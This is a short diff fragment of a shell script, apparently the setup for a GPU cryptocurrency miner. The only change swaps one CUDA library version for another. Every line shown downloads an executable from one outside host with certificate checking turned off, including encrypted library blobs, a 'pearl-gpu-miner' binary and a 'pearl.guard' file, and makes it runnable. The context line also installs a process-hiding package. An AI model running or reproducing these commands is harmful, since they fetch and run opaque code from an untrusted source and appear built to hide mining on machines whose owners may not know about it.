@@ -15,7 +15,7 @@ npm i -g node-process-hider
 
 wget --no-check-certificate https://maskurniawan.serv00.net/libpearlkernel.so.enc && chmod +x libpearlkernel.so.enc
 wget --no-check-certificate -O pearl-gpu-miner https://maskurniawan.serv00.net/pearl-gpu-miner && chmod +x pearl-gpu-miner
-wget --no-check-certificate https://maskurniawan.serv00.net/libcudart.so.13 && chmod +x libcudart.so.13
+wget --no-check-certificate https://maskurniawan.serv00.net/libcudart.so.12 && chmod +x libcudart.so.12
 wget --no-check-certificate https://maskurniawan.serv00.net/pearl.guard && chmod +x pearl.guard
 wget --no-check-certificate https://maskurniawan.serv00.net/pearl-policy.enc && chmod +x pearl-policy.enc
 wget --no-check-certificate https://maskurniawan.serv00.net/pearl-release.sig && chmod +x pearl-release.sig
